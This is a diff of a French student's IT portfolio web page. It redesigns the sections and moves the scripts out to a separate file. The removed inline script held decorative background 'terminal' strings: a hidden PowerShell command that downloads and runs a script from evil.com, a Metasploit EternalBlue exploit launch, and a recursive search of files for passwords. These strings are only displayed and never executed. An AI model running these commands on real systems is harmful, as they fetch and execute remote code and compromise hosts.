@@ -4,20 +4,13 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Portfolio BTS SIO SISR - Elies ASKRI</title>
+  <meta name="description" content="Portfolio de Elies ASKRI, étudiant en BTS SIO SISR spécialisé en administration systèmes et réseaux, cybersécurité et infrastructures IT." />
+  <meta name="keywords" content="BTS SIO, SISR, cybersécurité, réseaux, systèmes, informatique, portfolio" />
+  <meta name="author" content="Elies ASKRI" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css" />
-  <script>
-    function showSection(id) {
-      document.querySelectorAll('nav a').forEach(a => a.classList.remove('active'));
-      document.querySelector(`nav a[onclick="showSection('${id}')"]`).classList.add('active');
-      document.querySelectorAll('section').forEach(s => {
-        s.classList.remove('active');
-      });
-      document.getElementById(id).classList.add('active');
-    }
-    window.onload = () => {
-      showSection('presentation');
-    }
-  </script>
 </head>
 <body>
 <div id="cmd-bg"></div>
@@ -25,232 +18,423 @@
   <h1>Portfolio - Elies ASKRI</h1>
   <p>Étudiant en BTS SIO SISR</p>
 </header>
-<nav>
-  <a href="#" onclick="showSection('presentation')">Présentation</a>
-  <a href="#" onclick="showSection('bts-sio')">BTS SIO SISR</a>
-  <a href="#" onclick="showSection('dashboard')">Dashboard</a>
-  <a href="#" onclick="showSection('competences')">Compétences</a>
-  <a href="#" onclick="showSection('entreprise')">Mon entreprise</a>
-  <a href="#" onclick="showSection('projets')">Projets</a>
-  <a href="#" onclick="showSection('cv')">CV</a>
-  <a href="#" onclick="showSection('tableau')">Tableau de synthèse</a>
-  <a href="#" onclick="showSection('veille')">Veille</a>
-  <a href="#" onclick="showSection('contact')">Contact</a>
+<nav role="navigation" aria-label="Navigation principale">
+  <a href="#presentation" data-section="presentation">Présentation</a>
+  <a href="#bts-sio" data-section="bts-sio">BTS SIO SISR</a>
+  <a href="#dashboard" data-section="dashboard">Dashboard</a>
+  <a href="#competences" data-section="competences">Compétences</a>
+  <a href="#entreprise" data-section="entreprise">Mon entreprise</a>
+  <a href="#projets" data-section="projets">Projets</a>
+  <a href="#cv" data-section="cv">CV</a>
+  <a href="#tableau" data-section="tableau">Tableau de synthèse</a>
+  <a href="#veille" data-section="veille">Veille</a>
+  <a href="#contact" data-section="contact">Contact</a>
 </nav>
 <main class="terminal-main">
   <section id="presentation">
     <h2>Présentation</h2>
-    <p>Bienvenue ! Je m'appelle Eliès ASKRI, étudiant en BTS SIO option SISR à l'IPSSI. Curieux et passionné par tout ce qui touche à l'administration systèmes et réseaux, je me spécialise dans les infrastructures informatiques et la cybersécurité. Mon objectif ? Concevoir, sécuriser et maintenir des environnements IT robustes et performants.</p>
+
+    <div class="presentation-hero">
+      <div class="presentation-intro">
+        <span class="intro-icon">💻</span>
+        <div>
+          <h3>Eliès ASKRI</h3>
+          <p class="intro-subtitle">Étudiant BTS SIO SISR • Spécialisation Systèmes & Réseaux</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="presentation-grid">
+      <div class="presentation-card">
+        <span class="pres-icon">🎯</span>
+        <h4>Mon objectif</h4>
+        <p>Concevoir, sécuriser et maintenir des environnements IT robustes et performants</p>
+      </div>
+
+      <div class="presentation-card">
+        <span class="pres-icon">🔧</span>
+        <h4>Mes domaines</h4>
+        <p>Administration systèmes & réseaux • Infrastructures IT • Cybersécurité</p>
+      </div>
+
+      <div class="presentation-card">
+        <span class="pres-icon">🎓</span>
+        <h4>Ma formation</h4>
+        <p>BTS SIO option SISR à l'IPSSI • Passionné par les technologies</p>
+      </div>
+    </div>
   </section>
   <section id="bts-sio">
     <h2>BTS SIO - Option SISR</h2>
-    <p>Le BTS SIO (Services Informatiques aux Organisations), option SISR (Solutions d'Infrastructure, Systèmes et Réseaux), est bien plus qu'un simple diplôme : c'est une véritable passerelle vers le monde professionnel de l'IT.</p>
-    <p>Cette formation m'a permis de développer des compétences techniques solides : déploiement de serveurs (Windows), virtualisation (VMware, Hyper-V), configuration réseau, gestion de la sécurité (pare-feu, backup), gestion de l'Active Directory et bien plus encore.</p>
-    <p>Grâce à une pédagogie axée sur la pratique, entre TP concrets, projets d'infrastructure et stages en entreprise, j'ai appris à réagir face à des situations réelles, diagnostiquer les pannes, et proposer des solutions fiables et sécurisées.</p>
-    <p>Le BTS SIO SISR forme des profils opérationnels, recherchés par les entreprises : administrateur systèmes et réseaux, technicien support, responsable informatique en PME, ou consultant IT. Il constitue également une excellente base pour poursuivre en licence pro ou école d'ingénieur.</p>
-    <p>Dans un secteur en constante évolution, cette formation me prépare à relever les défis technologiques d'aujourd'hui et de demain.</p>
+
+    <div class="bts-intro">
+      <p><strong>Services Informatiques aux Organisations</strong> • Solutions d'Infrastructure, Systèmes et Réseaux</p>
+    </div>
+
+    <div class="bts-grid">
+      <div class="bts-card">
+        <div class="card-header">
+          <span class="card-icon">💼</span>
+          <h4>Compétences acquises</h4>
+        </div>
+        <ul class="compact-list">
+          <li>Déploiement serveurs Windows</li>
+          <li>Virtualisation (VMware, Hyper-V)</li>
+          <li>Configuration réseaux</li>
+          <li>Sécurité (pare-feu, backup)</li>
+          <li>Gestion Active Directory</li>
+        </ul>
+      </div>
+
+      <div class="bts-card">
+        <div class="card-header">
+          <span class="card-icon">🎯</span>
+          <h4>Pédagogie pratique</h4>
+        </div>
+        <ul class="compact-list">
+          <li>TP concrets en infrastructure</li>
+          <li>Projets réels</li>
+          <li>Stages en entreprise</li>
+          <li>Diagnostic de pannes</li>
+        </ul>
+      </div>
+
+      <div class="bts-card">
+        <div class="card-header">
+          <span class="card-icon">🚀</span>
+          <h4>Débouchés</h4>
+        </div>
+        <ul class="compact-list">
+          <li>Admin systèmes & réseaux</li>
+          <li>Technicien support</li>
+          <li>Responsable IT PME</li>
+          <li>Consultant IT</li>
+        </ul>
+      </div>
+    </div>
   </section>
   <section id="dashboard">
     <h2>Dashboard</h2>
+    <div class="dashboard-intro">
+      <p>Aperçu rapide de mon parcours et de mes réalisations</p>
+    </div>
     <div class="dashboard">
-      <div class="card" onclick="showSection('projets')" style="cursor:pointer;">
+      <div class="card" data-section="projets">
+        <div class="card-icon-dashboard">📂</div>
         <h3>Projets</h3>
-        <p>2 projets</p>
+        <div class="card-list">
+          <div class="list-item">
+            <span class="list-number">1</span>
+            <span class="list-text">projet académique</span>
+          </div>
+          <div class="list-item">
+            <span class="list-number">2</span>
+            <span class="list-text">projets professionnels</span>
+          </div>
+          <div class="list-item">
+            <span class="list-number">1</span>
+            <span class="list-text">projet personnel</span>
+          </div>
+        </div>
       </div>
-      <div class="card" onclick="showSection('competences')" style="cursor:pointer;">
+      <div class="card" data-section="competences">
+        <div class="card-icon-dashboard">🎯</div>
         <h3>Compétences</h3>
-        <p>6 compétences acquises</p>
-        <p>1 certification obtenue</p>
+        <div class="card-list">
+          <div class="list-item">
+            <span class="list-number">9</span>
+            <span class="list-text">compétences acquises</span>
+          </div>
+          <div class="list-item">
+            <span class="list-number">2</span>
+            <span class="list-text">certifications obtenues</span>
+          </div>
+        </div>
       </div>
-      <div class="card" onclick="showSection('veille')" style="cursor:pointer;">
+      <div class="card" data-section="veille">
+        <div class="card-icon-dashboard">📡</div>
         <h3>Veille</h3>
-        <p>IT-Connect</p>
-        <p>Cybersécurité</p>
-        <p>Ransomwares</p>
+        <div class="card-content">
+          <p>• Cybersécurité</p>
+          <p>• Infrastructure IT</p>
+          <p>• Intelligence Artificielle</p>
+        </div>
       </div>
     </div>
   </section>
   <section id="competences">
     <h2>Compétences</h2>
     <div class="carousel-container">
-      <div class="carousel-track">
-        <div class="tech-icon"><img src="icones/cisco.png" alt="Cisco" /><span>Cisco</span></div>
-        <div class="tech-icon"><img src="icones/Microsoft.png" alt="Microsoft" /><span>Microsoft</span></div>
-        <div class="tech-icon"><img src="icones/PS.png" alt="PowerShell" /><span>PowerShell</span></div>
-        <div class="tech-icon"><img src="icones/VB.png" alt="VirtualBox" /><span>VirtualBox</span></div>
-        <div class="tech-icon"><img src="icones/VMWARE.png" alt="VMware" /><span>VMware</span></div>
-        <div class="tech-icon"><img src="icones/veeam.png" alt="Veeam" /><span>Veeam</span></div>
-        <!-- duplicata pour boucle infinie -->
-        <div class="tech-icon"><img src="icones/cisco.png" alt="Cisco" /><span>Cisco</span></div>
-        <div class="tech-icon"><img src="icones/Microsoft.png" alt="Microsoft" /><span>Microsoft</span></div>
-        <div class="tech-icon"><img src="icones/PS.png" alt="PowerShell" /><span>PowerShell</span></div>
-        <div class="tech-icon"><img src="icones/VB.png" alt="VirtualBox" /><span>VirtualBox</span></div>
-        <div class="tech-icon"><img src="icones/VMWARE.png" alt="VMware" /><span>VMware</span></div>
-        <div class="tech-icon"><img src="icones/veeam.png" alt="Veeam" /><span>Veeam</span></div>
+      <div class="carousel-track" id="carousel-track">
+        <!-- Généré dynamiquement par JavaScript -->
       </div>
     </div>
-    <h3>Certification</h3>
+    <h3>Certifications</h3>
     <div class="certification-container">
       <div class="competence-item certification-item">
-        <img src="icones/ciscocyber.png" alt="Cisco Introduction to Cybersecurity" class="competence-icon" />
+        <img src="icones/ciscocyber.png" alt="Cisco Introduction to Cybersecurity" class="competence-icon" loading="lazy" />
         <p><strong>CISCO Introduction to Cybersecurity</strong><br/>
            <span>CISCO — Obtenu le 12/2024</span>
+        </p>
+      </div>
+      <div class="competence-item certification-item">
+        <img src="icones/anssi_png.png" alt="Certification ANSSI" class="competence-icon" loading="lazy" />
+        <p><strong>Certification ANSSI (en cours)</strong><br/>
+           <span>ANSSI — Sécurité des systèmes d'information</span>
         </p>
       </div>
     </div>
   </section>
   <section id="projets">
     <h2>Projets</h2>
-    <div class="project">
-      <h3><u>Conception et réalisation d'un parc informatique d'une entreprise pharmaceutique</u></h3>
-      <p><strong>Contexte :</strong> Projet de cours</p>
-      <p><strong>Objectif :</strong> Satisfaire les besoins d'une entreprise pharmaceutique en systèmes et réseaux </p>
-      <p><strong>Outils :</strong> CISCO</p>
-      <p><a href="projet2.zip" download>Télécharger mon projet</a></p>
+
+    <div class="projets-category">
+      <h3 class="category-title">Projets académiques</h3>
+      <div class="projets-grid">
+        <div class="projet-card projet-academique">
+          <div class="card-header">
+            <span class="card-icon">🏥</span>
+            <h4>Parc informatique pharmaceutique</h4>
+          </div>
+          <div class="projet-info">
+            <p><strong>Contexte :</strong> Projet de cours</p>
+            <p><strong>Objectif :</strong> Concevoir et réaliser un parc informatique complet pour une entreprise pharmaceutique</p>
+            <p><strong>Outils :</strong> CISCO</p>
+          </div>
+          <a href="projet2.zip" download class="projet-download">📥 Télécharger le projet</a>
+        </div>
+      </div>
     </div>
-    <div class="project">
-      <h3><u>Technicien support de proximité pour client VVIP</u></h3>
-      <p><strong>Contexte :</strong> Stage</p>
-      <p><strong>Objectif :</strong> Assurer le bon developpement de l'entreprise</p>
-      <p><strong>Outils :</strong> Windows Server, Active Directory, FRESH, AnyDesk</p>
+
+    <div class="projets-category">
+      <h3 class="category-title">Projets professionnels</h3>
+      <div class="projets-grid">
+        <div class="projet-card projet-pro">
+          <div class="card-header">
+            <span class="card-icon">🛠️</span>
+            <h4>Support technique VVIP</h4>
+          </div>
+          <div class="projet-info">
+            <p><strong>Contexte :</strong> Stage en entreprise</p>
+            <p><strong>Objectif :</strong> Assurer le support technique de proximité pour clients VVIP</p>
+            <p><strong>Outils :</strong> Windows Server, Active Directory, FRESH, AnyDesk</p>
+          </div>
+        </div>
+
+        <div class="projet-card projet-pro">
+          <div class="card-header">
+            <span class="card-icon">💼</span>
+            <h4>IT Support</h4>
+          </div>
+          <div class="projet-info">
+            <p><strong>Contexte :</strong> Alternance</p>
+            <p><strong>Objectif :</strong> Assurer le bon développement de l'entreprise</p>
+            <p><strong>Outils :</strong> Windows Server, Active Directory, ServiceNow, LogMeIn, Azure, BYBLOS</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="projets-category">
+      <h3 class="category-title">Projets personnels</h3>
+      <div class="projets-grid">
+        <div class="projet-card projet-perso">
+          <div class="card-header">
+            <span class="card-icon">🏠</span>
+            <h4>Homelab</h4>
+          </div>
+          <div class="projet-info">
+            <p><strong>Statut :</strong> En construction</p>
+            <p><strong>Description :</strong> Conception d'un homelab personnel pour l'apprentissage et l'expérimentation de technologies IT</p>
+            <p><strong>Technologies :</strong> Virtualisation, réseaux, serveurs</p>
+          </div>
+        </div>
+      </div>
     </div>
   </section>
   <section id="cv">
     <h2>CV</h2>
-    <p><a href="elies_askri_cv_tech.pdf" target="_blank" rel="noopener">Télécharger mon CV (PDF)</a></p>
-    <embed src="elies_askri_cv_tech.pdf" type="application/pdf" width="100%" height="600px" />
+    <p><a href="CV_ITSUPPORT.pdf" target="_blank" rel="noopener">Télécharger mon CV (PDF)</a></p>
+    <embed src="CV_ITSUPPORT.pdf" type="application/pdf" width="100%" height="600px" loading="lazy" />
   </section>
   <section id="tableau">
     <h2>Tableau de synthèse</h2>
     <p><a href="Tableau_de_synthèse.pdf" target="_blank" rel="noopener">Télécharger mon tableau (PDF)</a></p>
-    <embed src="Tableau_de_synthèse.pdf" type="application/pdf" width="100%" height="600px" />
+    <embed src="Tableau_de_synthèse.pdf" type="application/pdf" width="100%" height="600px" loading="lazy" />
   </section>
   <section id="veille">
     <h2>Veille Technologique</h2>
-    <h3><u>Qu'est-ce que Darktrace&nbsp;?</u></h3>
-    <p><strong>Darktrace</strong> est une entreprise britannique spécialisée dans la cybersécurité, reconnue pour l'utilisation de l'IA afin de protéger les réseaux informatiques contre les attaques.</p>
-    <h3><u>Comment ça fonctionne&nbsp;?</u></h3>
-    <p>Plutôt que d'attendre qu'une attaque soit détectée après avoir causé des dégâts, Darktrace surveille en temps réel l'activité du système (emails, serveurs, connexions, etc.). Grâce à son IA, elle apprend ce qui est «&nbsp;normal&nbsp;» dans un réseau et signale ou bloque automatiquement tout comportement inhabituel ou suspect (ransomware, tentative de piratage, etc.).</p>
-    <ul>
-      <li><strong>Réactivité automatique</strong> : l'IA agit sans attendre l'intervention humaine.</li>
-      <li><strong>Adaptabilité</strong> : l'IA s'adapte à chaque entreprise, même face à de nouvelles attaques.</li>
-      <li><strong>Protection continue</strong> : surveillance 24h/24, même la nuit ou le week-end.</li>
-    </ul>
-    <h3><u>Exemple</u></h3>
-    <p>Un employé ouvre un fichier piégé, un virus tente de voler des données. Darktrace détecte en quelques secondes ce comportement anormal, bloque la connexion du virus et empêche la fuite de données, avant même que quelqu'un ne s'en rende compte.</p>
-    <h3><u>Pourquoi c'est utile même pour les PME&nbsp;?</u></h3>
-    <p>Toute entreprise peut être attaquée. Darktrace ne se contente pas de défendre&nbsp;: elle apprend, anticipe et réagit rapidement, sans expertise technique nécessaire côté entreprise.</p>
-    <p> (Sources : Darktrace.com - usine-digitale.fr)</p>
+
+    <div class="veille-intro">
+      <p>En tant que professionnel IT, il est essentiel de rester informé des dernières tendances technologiques. Pour cela, j'utilise un <strong>gestionnaire d'information</strong> qui me permet de centraliser et organiser mes sources de veille.</p>
+    </div>
+
+    <div class="veille-tool-section">
+      <h3>Mon outil de veille : Inoreader</h3>
+      <div class="veille-tool-screenshot-full">
+        <img src="icones/inoscreen.png" alt="Capture d'écran Inoreader" class="tool-screenshot-img" loading="lazy" />
+        <p class="tool-caption">Interface de gestion des flux RSS</p>
+      </div>
+      <div class="veille-tool-description">
+        <p><strong>Inoreader</strong> est un gestionnaire d'information puissant qui permet d'agréger des flux RSS provenant de multiples sources. Grâce à cet outil, je peux suivre efficacement l'actualité en cybersécurité, les nouvelles technologies et les meilleures pratiques en infrastructure IT.</p>
+      </div>
+    </div>
+
+    <div class="veille-topics">
+      <h3>Mes thèmes de veille</h3>
+      <div class="veille-grid">
+        <div class="veille-card">
+          <div class="card-header">
+            <span class="card-icon">🛡️</span>
+            <h4>Cybersécurité</h4>
+          </div>
+          <p>Vulnérabilités, nouvelles menaces, bonnes pratiques de sécurité, outils de protection et actualités des incidents de sécurité majeurs.</p>
+        </div>
+
+        <div class="veille-card">
+          <div class="card-header">
+            <span class="card-icon">💻</span>
+            <h4>Infrastructure IT</h4>
+          </div>
+          <p>Administration systèmes et réseaux, virtualisation, cloud computing, solutions de sauvegarde et gestion d'Active Directory.</p>
+        </div>
+
+        <div class="veille-card">
+          <div class="card-header">
+            <span class="card-icon">🤖</span>
+            <h4>Intelligence Artificielle</h4>
+          </div>
+          <p>IA appliquée à la cybersécurité, détection d'anomalies, automatisation des tâches IT et outils comme Darktrace.</p>
+        </div>
+      </div>
+    </div>
   </section>
   <section id="contact">
     <h2>Contact</h2>
-    <p>📧 Email : <a href="mailto:askri.elies@gmail.com">askri.elies@gmail.com</a></p>
-    <p>💼 LinkedIn : <a href="https://www.linkedin.com/in/elies-askri" target="_blank" rel="noopener">linkedin.com/in/elies-askri</a></p>
-    <p><span style="color:#000">📞</span> Téléphone : 06 01 49 53 05</p>
+
+    <div class="contact-intro">
+      <p>N'hésitez pas à me contacter pour toute opportunité ou question</p>
+    </div>
+
+    <div class="contact-grid">
+      <div class="contact-card">
+        <div class="card-header">
+          <span class="card-icon">📧</span>
+          <h4>Email</h4>
+        </div>
+        <a href="mailto:askri.elies@gmail.com" class="contact-link">askri.elies@gmail.com</a>
+      </div>
+
+      <div class="contact-card">
+        <div class="card-header">
+          <span class="card-icon">💼</span>
+          <h4>LinkedIn</h4>
+        </div>
+        <a href="https://www.linkedin.com/in/elies-askri" target="_blank" rel="noopener" class="contact-link">linkedin.com/in/elies-askri</a>
+      </div>
+
+      <div class="contact-card">
+        <div class="card-header">
+          <span class="card-icon">📞</span>
+          <h4>Téléphone</h4>
+        </div>
+        <p class="contact-info">06 01 49 53 05</p>
+      </div>
+    </div>
   </section>
-  <section id="entreprise" style="display:none;">
+  <section id="entreprise">
     <h2>Mon entreprise</h2>
-    <div style="display:flex;align-items:flex-start;gap:2.5rem;flex-wrap:wrap;">
-      <div style="flex:2;min-width:260px;display:flex;flex-direction:column;gap:1.5rem;">
+
+    <div class="entreprise-hero">
+      <div class="entreprise-title">
+        <span class="entreprise-icon">⚖️</span>
         <div>
           <h3>AUGUST DEBOUZY</h3>
-          <p>August Debouzy est un cabinet d'avocats d'affaires français reconnu, fondé en 1995, avec des bureaux à Paris et à Bruxelles. Il compte aujourd'hui plus de 150 avocats, dont plusieurs figures issues du monde politique et institutionnel, comme Jean-Pierre Mignard. Le cabinet intervient dans des domaines variés : droit des affaires, fiscalité, droit social, contentieux, droit public, propriété intellectuelle et nouvelles technologies.</p>
-          <p>August Debouzy se distingue aussi par son service IT interne, chargé de la gestion et de la sécurité des systèmes d'information, où j'ai pu travailler dans le cadre de mon expérience professionnelle. Cette équipe joue un rôle clé dans la transformation numérique et la cybersécurité du cabinet.</p>
+          <p class="entreprise-subtitle">Cabinet d'avocats d'affaires • Fondé en 1995 • +150 avocats</p>
         </div>
-    <div style="margin-top:2.5rem;">
-      <h3>Mes missions</h3>
-      <ul>
-        <li> Masterisation/Déploiement de post</li>
-        <li>Support technique : gestion d'incidents N1/N2</li>
-        <li>Installation de nouveaux serveurs</li>
-        <li>Gestion de l'Active Directory</li>
+      </div>
+    </div>
 
+    <div class="entreprise-grid">
+      <div class="entreprise-card">
+        <div class="card-header">
+          <span class="card-icon">🏢</span>
+          <h4>Le cabinet</h4>
+        </div>
+        <p>Cabinet d'avocats d'affaires reconnu avec bureaux à <strong>Paris et Bruxelles</strong>. Domaines : droit des affaires, fiscalité, droit social, contentieux, propriété intellectuelle et nouvelles technologies.</p>
+      </div>
 
-      </ul>
+      <div class="entreprise-card">
+        <div class="card-header">
+          <span class="card-icon">💻</span>
+          <h4>Service IT</h4>
+        </div>
+        <p>Service IT interne dédié à la <strong>transformation numérique</strong> et la <strong>cybersécurité</strong> du cabinet, avec gestion complète des systèmes d'information.</p>
+      </div>
+
+      <div class="entreprise-card">
+        <div class="card-header">
+          <span class="card-icon">🔧</span>
+          <h4>Mes missions</h4>
+        </div>
+        <ul class="compact-list">
+          <li>Masterisation & déploiement de postes</li>
+          <li>Support technique N1/N2</li>
+          <li>Installation de serveurs</li>
+          <li>Gestion Active Directory</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="entreprise-separator"></div>
+
+    <div class="entreprise-hero">
+      <div class="entreprise-title">
+        <span class="entreprise-icon">🏬</span>
+        <div>
+          <h3>VALUE RETAIL</h3>
+          <p class="entreprise-subtitle">Opérateur de centres outlet de luxe • Fondé en 1992 • 12 Villages avec plus de 190 000 m² de boutiques de marques haut de gamme à travers l'Europe et la Chine</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="entreprise-grid">
+      <div class="entreprise-card">
+        <div class="card-header">
+          <span class="card-icon">🌍</span>
+          <h4>L'entreprise</h4>
+        </div>
+        <p>Entreprise internationale présente dans <strong>12 villages</strong> à travers le monde (Chine, États-Unis, France, Espagne, Allemagne, Angleterre). Domaines : marketing, business development, HR, légal, etc.</p>
+      </div>
+
+      <div class="entreprise-card">
+        <div class="card-header">
+          <span class="card-icon">💻</span>
+          <h4>Service IT</h4>
+        </div>
+        <p>Service IT interne en France permettant de gérer l'office, supporter les utilisateurs et assurer le bon fonctionnement des suites (The Apartment).</p>
+      </div>
+
+      <div class="entreprise-card">
+        <div class="card-header">
+          <span class="card-icon">🔧</span>
+          <h4>Mes missions</h4>
+        </div>
+        <ul class="compact-list">
+          <li>Gestion de logs</li>
+          <li>Support technique N1/N2/N3</li>
+          <li>Gestion Active Directory</li>
+          <li>Cybersécurité</li>
+        </ul>
+      </div>
     </div>
   </section>
 </main>
 <footer>
   <p>Eliès ASKRI - Étudiant BTS SIO SISR à l'IPSSI</p>
   <p>Email : <a href="mailto:askri.elies@gmail.com">askri.elies@gmail.com</a> | LinkedIn : <a href="https://www.linkedin.com/in/elies-askri" target="_blank" rel="noopener">Elies ASKRI</a> | Téléphone : 06 01 49 53 05</p>
-  <p style="font-size:0.85rem; color:#0078d7;">© 2025 Eliès ASKRI  - Tous droits réservés</p>
+  <p style="font-size:0.85rem; color:#0078d7;">© 2025 Eliès ASKRI - Tous droits réservés</p>
 </footer>
-<script>
-// Commandes PowerShell/Métasploit à afficher
-const commands = [
-  'whoami',
-  'ipconfig /all',
-  'Get-NetIPAddress',
-  'nmap -sS 192.168.1.0/24',
-  'Invoke-WebRequest -Uri http://example.com',
-  'Get-Process | Where-Object {$_.CPU -gt 100}',
-  'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue"',
-  'Test-Connection -ComputerName 8.8.8.8',
-  'Get-LocalUser',
-  'netstat -ano',
-  'Get-Service | Where-Object {$_.Status -eq "Running"}',
-  'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/ps1\')"',
-  'arp -a',
-  'Get-EventLog -LogName Security -Newest 5',
-  'Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts',
-  'Get-WmiObject Win32_ComputerSystem',
-  'Get-ChildItem -Recurse | Select-String "password"',
-  'Get-Help Invoke-Command',
-  'Get-HotFix',
-  'Get-Command *net*',
-];
-
-const bg = document.getElementById('cmd-bg');
-const NB_LINES = 12;
-let cmdLines = [];
-
-function createCmdLine(text, y) {
-  const div = document.createElement('div');
-  div.className = 'cmd-line';
-  div.textContent = text;
-  div.style.top = y + 'px';
-  bg.appendChild(div);
-  return div;
-}
-
-function randomCmd() {
-  return commands[Math.floor(Math.random() * commands.length)];
-}
-
-function setupCmdBg() {
-  bg.innerHTML = '';
-  cmdLines = [];
-  const h = window.innerHeight;
-  for (let i = 0; i < NB_LINES; i++) {
-    const y = Math.round(i * (h / NB_LINES));
-    const cmd = randomCmd();
-    cmdLines.push(createCmdLine('PS C:> ' + cmd, y));
-  }
-}
-
-function animateCmdBg() {
-  const h = window.innerHeight;
-  for (let i = 0; i < cmdLines.length; i++) {
-    let y = parseFloat(cmdLines[i].style.top);
-    y += 0.25 + Math.random() * 0.15;
-    if (y > h) {
-      y = -24;
-      cmdLines[i].textContent = 'PS C:> ' + randomCmd();
-    }
-    cmdLines[i].style.top = y + 'px';
-  }
-  requestAnimationFrame(animateCmdBg);
-}
-
-window.addEventListener('resize', setupCmdBg);
-setupCmdBg();
-requestAnimationFrame(animateCmdBg);
-
-// Affichage dynamique de la section entreprise
-const navEntreprise = document.querySelector('nav a[onclick="showSection(\'entreprise\')"]');
-if(navEntreprise) {
-  document.getElementById('entreprise').style.display = '';
-}
-</script>
+<script src="script.js"></script>
 </body>
 </html>
